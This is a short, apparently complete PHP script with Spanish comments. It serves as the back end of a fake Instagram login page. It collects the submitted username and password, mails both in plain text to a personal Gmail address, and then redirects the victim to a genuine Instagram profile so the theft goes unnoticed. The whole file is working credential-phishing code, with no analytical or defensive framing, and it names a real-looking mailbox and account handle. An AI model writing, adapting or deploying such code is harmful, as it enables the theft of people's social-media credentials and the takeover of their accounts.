<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recolectar los datos del formulario
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Configuración del correo electrónico
    $to = "martinhr1303@gmail.com";
    $subject = "Datos del formulario de Instagram";
    $message = "Usuario: $username\nContraseña: $password";
    $headers = "From: no-reply@tusitio.com\r\n";
    $headers .= "Reply-To: no-reply@tusitio.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Enviar el correo electrónico
    $mail_sent = mail($to, $subject, $message, $headers);

    // Redirigir después de enviar el correo
    if ($mail_sent) {
        // Cambia la URL a la que deseas redirigir
        header("Location: https://www.instagram.com/m.hernandezz3/"); // Reemplaza con tu URL
        exit(); // Asegúrate de llamar a exit después de header para detener la ejecución del script
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "Método de solicitud no válido.";
}
?>
